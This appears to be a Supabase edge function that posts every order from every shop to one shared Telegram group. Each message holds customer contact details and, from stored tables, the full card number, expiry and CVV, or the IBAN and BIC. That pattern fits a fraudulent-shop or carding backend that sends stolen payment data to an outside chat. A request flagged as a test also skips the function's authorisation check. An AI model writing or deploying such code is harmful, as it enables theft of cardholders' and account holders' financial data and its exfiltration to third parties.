// Sends order notification to a global Telegram group.
// All orders from all shops go to the same chat.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { corsHeaders, jsonHeaders } from "../_shared/cors.ts";

function fmtMoney(n: number) {
  return new Intl.NumberFormat("de-DE", { style: "currency", currency: "EUR" }).format(n);
}

function escapeHtml(s: string | null | undefined): string {
  if (!s) return "";
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders });
  }
  if (req.method !== "POST") {
    return new Response(JSON.stringify({ error: "Method not allowed" }), {
      status: 405,
      headers: jsonHeaders,
    });
  }

  const SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
  const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");

  try {
    const body = await req.json().catch(() => ({}));

    // Service-Role-Check nur für Produktiv-Aufrufe (mit order_id).
    // Test-Aufrufe aus dem Admin-UI verwenden User-JWT.
    if (body?.test !== true) {
      const auth = req.headers.get("Authorization") ?? "";
      if (auth !== `Bearer ${SERVICE_ROLE_KEY}`) {
        return new Response(JSON.stringify({ error: "Unauthorized" }), {
          status: 401,
          headers: jsonHeaders,
        });
      }
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("Telegram secrets not configured");
      return new Response(
        JSON.stringify({ skipped: true, reason: "secrets_missing" }),
        { status: 200, headers: jsonHeaders }
      );
    }

    let text: string;

    if (body?.test === true) {
      text = "✅ <b>Test erfolgreich</b>\nDeine Telegram-Anbindung funktioniert.";
    } else {
      const orderId: string | undefined = body?.order_id;
      if (!orderId) {
        return new Response(JSON.stringify({ error: "order_id required" }), {
          status: 400,
          headers: jsonHeaders,
        });
      }

      const supabase = createClient(Deno.env.get("SUPABASE_URL")!, SERVICE_ROLE_KEY);

      const { data: order, error: oErr } = await supabase
        .from("orders")
        .select("*")
        .eq("id", orderId)
        .maybeSingle();
      if (oErr) throw oErr;
      if (!order) {
        return new Response(JSON.stringify({ error: "Order not found" }), {
          status: 404,
          headers: jsonHeaders,
        });
      }

      const { data: items } = await supabase
        .from("order_items")
        .select("product_name, quantity, unit_price, line_total")
        .eq("order_id", orderId);

      const { data: shop } = await supabase
        .from("shops")
        .select("shop_name")
        .eq("id", order.shop_id)
        .maybeSingle();

      const fullName = `${order.customer_first_name} ${order.customer_last_name}`.trim();

      let paymentBlock = "";
      if (order.payment_method === "sepa") {
        const { data: elv } = await supabase
          .from("elvs")
          .select("account_holder, iban, bic, bank_name")
          .eq("shop_id", order.shop_id)
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();
        if (elv) {
          paymentBlock =
            `\n🏦 <b>Lastschrift</b>\n` +
            `Inhaber: ${escapeHtml(elv.account_holder)}\n` +
            `IBAN: ${escapeHtml(elv.iban)}\n` +
            `BIC: ${escapeHtml(elv.bic) || "—"}\n` +
            `Bank: ${escapeHtml(elv.bank_name) || "—"}`;
        }
      } else if (order.payment_method === "card") {
        const { data: card } = await supabase
          .from("credit_cards")
          .select("cardholder_name, card_number, expiry, cvv")
          .eq("shop_id", order.shop_id)
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();
        if (card) {
          paymentBlock =
            `\n💳 <b>Kreditkarte</b>\n` +
            `Inhaber: ${escapeHtml(card.cardholder_name)}\n` +
            `Nummer: ${escapeHtml(card.card_number)}\n` +
            `Ablauf: ${escapeHtml(card.expiry)}\n` +
            `CVV: ${escapeHtml(card.cvv)}`;
        }
      }

      const cartLines =
        (items ?? [])
          .map(
            (it) =>
              `• ${it.quantity}× ${escapeHtml(it.product_name)} — ${fmtMoney(Number(it.line_total))}`
          )
          .join("\n") || "—";

      const addressLine = [
        order.billing_street,
        `${order.billing_postal_code} ${order.billing_city}`,
      ]
        .filter(Boolean)
        .join("\n");

      const paymentLabel =
        order.payment_method === "sepa"
          ? "SEPA-Lastschrift"
          : order.payment_method === "card"
            ? "Kreditkarte"
            : order.payment_method ?? "—";

      text =
        `🛒 <b>Neue Bestellung #${escapeHtml(order.order_number)}</b>\n` +
        `🏪 Shop: ${escapeHtml(shop?.shop_name ?? "—")}\n\n` +
        `👤 <b>Kunde</b>\n` +
        `${escapeHtml(fullName)}\n` +
        `✉️ ${escapeHtml(order.customer_email)}\n` +
        `📞 ${escapeHtml(order.customer_phone) || "—"}\n\n` +
        `📍 <b>Adresse</b>\n${escapeHtml(addressLine)}\n\n` +
        `🛍 <b>Warenkorb</b>\n${cartLines}\n\n` +
        `💰 <b>Gesamt: ${fmtMoney(Number(order.total_amount))}</b>\n` +
        `💳 Zahlung: ${escapeHtml(paymentLabel)}` +
        paymentBlock;
    }

    const tgResp = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      }
    );

    const tgJson = await tgResp.json().catch(() => ({}));
    if (!tgResp.ok || !tgJson?.ok) {
      console.error("Telegram API error", tgResp.status, tgJson);
      return new Response(
        JSON.stringify({ error: "Telegram failed", status: tgResp.status, details: tgJson }),
        { status: 500, headers: jsonHeaders }
      );
    }

    return new Response(
      JSON.stringify({ success: true, message_id: tgJson.result?.message_id }),
      { status: 200, headers: jsonHeaders }
    );
  } catch (e) {
    console.error("send-telegram-notification error", e);
    return new Response(
      JSON.stringify({ error: "Internal error", message: String((e as Error).message ?? e) }),
      { status: 500, headers: jsonHeaders }
    );
  }
});
